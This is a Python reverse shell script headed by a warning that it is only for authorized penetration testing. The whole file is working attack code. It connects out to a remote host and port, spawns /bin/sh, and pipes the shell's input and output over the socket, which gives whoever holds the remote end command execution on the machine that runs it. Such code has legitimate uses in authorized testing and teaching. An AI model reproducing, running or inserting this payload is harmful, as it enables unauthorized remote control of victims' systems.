#!/usr/bin/env python3
"""
Reverse Shell Payload for Controlled Testing

WARNING: This script is intended solely for authorized penetration testing 
in controlled environments. Unauthorized use is strictly prohibited and may 
be illegal.
"""

import socket
import subprocess
import threading

BUFFER_SIZE = 1024

def establish_connection(remote_host, remote_port, log_callback):
    """
    Attempt to create an outbound TCP connection to the specified remote host.
    Returns the connected socket or None if connection fails.
    """
    try:
        log_callback(f"Attempting to connect to {remote_host}:{remote_port} ...")
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((remote_host, remote_port))
        log_callback("Connection established.")
        return s
    except Exception as e:
        log_callback(f"[ERROR] Connection failed: {e}")
        return None

def start_shell(connection, log_callback):
    """
    Spawn a shell on the target system and redirect its I/O to the given connection.
    This creates a reverse shell.
    """
    try:
        # For Unix-like systems; for Windows use "cmd.exe" or "powershell.exe"
        shell = subprocess.Popen(
            "/bin/sh",
            shell=True,
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,   # Use text mode for string I/O
            bufsize=0
        )
        log_callback("Shell spawned successfully.")
    except Exception as e:
        try:
            connection.sendall(f"[ERROR] Failed to spawn shell: {e}\n".encode())
        except Exception:
            pass
        connection.close()
        log_callback(f"[ERROR] Failed to spawn shell: {e}")
        return

    def forward_input():
        try:
            while True:
                data = connection.recv(BUFFER_SIZE)
                if not data:
                    break
                shell.stdin.write(data.decode())
                shell.stdin.flush()
        except Exception:
            pass

    def forward_output():
        try:
            while True:
                output = shell.stdout.readline()
                if output == "":
                    break
                connection.sendall(output.encode())
        except Exception:
            pass

    input_thread = threading.Thread(target=forward_input, daemon=True)
    output_thread = threading.Thread(target=forward_output, daemon=True)
    input_thread.start()
    output_thread.start()

    input_thread.join()
    output_thread.join()

    connection.close()
    shell.terminate()
    log_callback("Connection closed and shell terminated.")
